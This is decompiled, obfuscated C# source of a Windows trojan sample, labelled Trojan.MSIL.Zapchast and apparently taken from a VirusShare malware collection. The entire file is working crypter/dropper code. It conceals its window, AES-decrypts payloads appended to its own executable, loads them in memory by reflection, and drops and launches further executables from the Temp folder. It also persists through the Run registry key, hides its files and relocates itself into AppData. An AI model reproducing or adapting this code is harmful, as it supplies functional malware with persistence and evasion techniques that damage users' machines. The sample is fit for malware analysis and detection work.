// Decompiled with JetBrains decompiler
// Type: .
// Assembly: ShockService, Version=87.87.87.56, Culture=neutral, PublicKeyToken=null
// MVID: 55A0E0A5-AB41-44D9-A74D-85F736D6F640
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.Zapchast.aellb-989ad35078ca7e5257afad1366c6ae96152ac52d7d20365e4d1f524f11b892f0.exe

using \u0004;
using \u0007;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace \u0004
{
  [DesignerGenerated]
  internal sealed class \u0002 : Form
  {
    private IContainer \u0001;
    [AccessedThroughProperty("Button1")]
    private Button \u0001;
    [AccessedThroughProperty("Timer1")]
    private Timer \u0001;
    private RegistryKey \u0001;
    private byte[] \u0001;
    private Random \u0001;
    private byte[] \u0002;
    private byte[] \u0003;
    private string \u0001;

    public \u0002()
    {
      this.Load += new EventHandler(this.\u0001);
      this.\u0001 = Registry.CurrentUser;
      this.\u0001 = new Random();
      this.\u0002 = \u0001.Function1;
      this.\u0003 = \u0001.service;
      this.\u0001 = Path.GetTempPath() + "service.exe";
      this.\u0001();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          goto label_2;
label_1:
        if (this.\u0001 != null)
          this.\u0001.Dispose();
label_2:
        if (false)
          goto label_1;
      }
      finally
      {
        if (true)
          base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void \u0001()
    {
      this.\u0001 = (IContainer) new System.ComponentModel.Container();
      this.Button1 = new Button();
      this.Timer1 = new Timer(this.\u0001);
      this.SuspendLayout();
      this.Button1.Location = new Point(12, 2);
      this.Button1.Name = "Button1";
      Button button1 = this.Button1;
      Size size1 = new Size(56, 23);
      Size size2 = size1;
      button1.Size = size2;
      this.Button1.TabIndex = 0;
      this.Button1.Text = "Check";
      this.Button1.UseVisualStyleBackColor = true;
      this.Timer1.Interval = 100000;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(85, 31);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.Button1);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.Name = "Form1";
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.ResumeLayout(false);
    }

    internal virtual Button Button1
    {
      get => this.\u0001;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\u0002);
        if (this.\u0001 != null)
          this.\u0001.Click -= eventHandler;
        this.\u0001 = value;
        if (this.\u0001 == null)
          return;
        this.\u0001.Click += eventHandler;
      }
    }

    internal virtual Timer Timer1
    {
      get => this.\u0001;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\u0003);
        if (this.\u0001 != null)
          this.\u0001.Tick -= eventHandler;
        this.\u0001 = value;
        if (this.\u0001 == null)
          return;
        this.\u0001.Tick += eventHandler;
      }
    }

    private void \u0001(object sender, EventArgs e)
    {
      string[] strArray = Strings.Split(File.ReadAllText(Application.ExecutablePath), "A3E06K76EPzT37967EY");
      string s = Conversions.ToString(\u0002.\u0001(strArray[1], "Blabla"));
      this.\u0001 = Encoding.Default.GetBytes(s);
      this.\u0002();
      if (Conversions.ToBoolean(strArray[2]))
      {
        Conversions.ToString(\u0002.\u0001(strArray[3], "Balbla"));
        Encoding.Default.GetBytes(s);
        File.WriteAllBytes(Path.GetTempPath() + "\\" + strArray[4], this.\u0001);
        Process.Start(Path.GetTempPath() + "\\" + strArray[4]);
      }
      if (Conversions.ToBoolean(strArray[5]))
      {
        File.Copy(Application.ExecutablePath, Path.GetTempPath() + "Serve.exe", true);
        this.\u0001.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", true).SetValue("Serve", (object) (Path.GetTempPath() + "Serve.exe"), RegistryValueKind.String);
      }
      if (Conversions.ToBoolean(strArray[6]))
      {
        try
        {
          File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(strArray[7]))
        this.\u0001(Conversions.ToString(this.\u0001.Next(1, 10000)) + ".exe");
      this.Timer1.Start();
    }

    public static object \u0001(string Decrypt, string Key)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      byte[] numArray1 = new byte[8];
      byte[] numArray2;
      if (true)
        numArray2 = numArray1;
      numArray2[0] = (byte) 1;
      if (true)
        goto label_9;
label_1:
      MemoryStream memoryStream = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
      try
      {
        byte[] buffer = Convert.FromBase64String(Decrypt);
        cryptoStream.Write(buffer, 0, buffer.Length);
        if (true)
          cryptoStream.Close();
        Decrypt = Encoding.UTF8.GetString(memoryStream.ToArray());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (object) Decrypt;
label_9:
      numArray2[1] = (byte) 2;
      numArray2[2] = (byte) 3;
      numArray2[3] = (byte) 4;
      numArray2[4] = (byte) 5;
      numArray2[5] = (byte) 6;
      numArray2[6] = (byte) 7;
      numArray2[7] = (byte) 8;
      byte[] salt = numArray2;
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Key, salt);
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
      goto label_1;
    }

    private void \u0002(object sender, EventArgs e)
    {
    }

    public void \u0002() => RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Assembly.Load(this.\u0002).GetType("Function1.Fuck").GetMethod("You").Invoke((object) null, new object[1]
    {
      (object) this.\u0001
    })));

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void \u0001(string NewName)
    {
      try
      {
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        if (true)
          goto label_5;
label_3:
        ProjectData.EndApp();
        return;
label_5:
        if (Operators.CompareString(Application.StartupPath, folderPath, false) == 0)
        {
          FileSystem.Kill(Interaction.Command());
        }
        else
        {
          FileSystem.FileCopy(Application.ExecutablePath, folderPath + "\\" + NewName);
          string[] strArray = new string[5];
          if (false)
            return;
          strArray[0] = folderPath;
          strArray[1] = "\\";
          strArray[2] = NewName;
          strArray[3] = " ";
          strArray[4] = Application.ExecutablePath;
          Interaction.Shell(string.Concat(strArray));
          FileAttributes fileAttributes = FileAttributes.Hidden;
          File.SetAttributes(folderPath + "\\" + NewName, fileAttributes);
          goto label_3;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void \u0003(object sender, EventArgs e)
    {
      string path = this.\u0001;
      byte[] bytes = this.\u0003;
      if (true)
        File.WriteAllBytes(path, bytes);
      Process.Start(this.\u0001);
      this.Timer1.Stop();
    }
  }
}
